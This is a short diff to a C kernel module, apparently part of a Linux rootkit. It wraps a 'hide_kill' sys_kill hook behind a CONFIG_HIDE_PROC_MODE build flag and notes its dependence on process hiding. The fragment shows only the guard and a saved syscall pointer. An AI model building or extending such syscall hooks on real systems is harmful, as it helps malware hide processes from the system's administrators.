@@ -8,6 +8,8 @@
 #include "inline_hook/utils/p_memory.h"
 #include "version_control.h"
 
+#ifdef CONFIG_HIDE_PROC_MODE  // hide_kill depends on hide_proc for is_pid_hidden
+
 // Storage for the original sys_kill function pointer
 // The actual sys_kill function takes pid and sig, not pt_regs.
 static asmlinkage long (*original_sys_kill)(pid_t pid, int sig);
@@ -74,3 +76,4 @@ void hide_kill_exit(void)
         }
     }
 }
+#endif
